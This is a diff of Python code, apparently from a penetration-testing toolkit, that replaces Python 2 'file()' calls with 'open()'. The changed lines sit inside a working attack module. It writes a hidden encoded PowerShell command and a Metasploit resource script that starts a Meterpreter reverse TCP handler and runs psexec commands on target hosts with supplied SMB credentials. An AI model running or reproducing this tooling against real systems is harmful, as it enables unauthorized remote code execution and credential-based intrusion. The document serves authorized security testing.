@@ -61,7 +61,7 @@ try:
     if port == "":
         port = "443"
     update_options("PORT=" + port)
-    filewrite = file(setdir + "/payload_options.shellcode", "w")
+    filewrite = open(setdir + "/payload_options.shellcode", "w")
     # format needed for shellcode generation
     filewrite.write(payload + " " + port + ",")
     filewrite.close()
@@ -76,12 +76,12 @@ try:
     if not os.path.isdir(setdir + "/reports/powershell"):
         os.makedirs(setdir + "/reports/powershell")
 
-    x86 = file(setdir + "/x86.powershell", "r")
+    x86 = open(setdir + "/x86.powershell", "r")
     x86 = x86.read()
     x86 = "powershell -nop -win hidden -noni -enc " + x86
     print_status(
         "If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
-    filewrite = file(
+    filewrite = open(
         setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
     filewrite.write(x86)
     filewrite.close()
@@ -89,7 +89,7 @@ try:
     command = x86  # assign powershell to command
 
     # write out our answer file for the powershell injection attack
-    filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
+    filewrite = open(setdir + "/reports/powershell/powershell.rc", "w")
     filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" %
                     (port, rhosts, username, password, domain, threads, command, stage_encoding))
     filewrite.close()
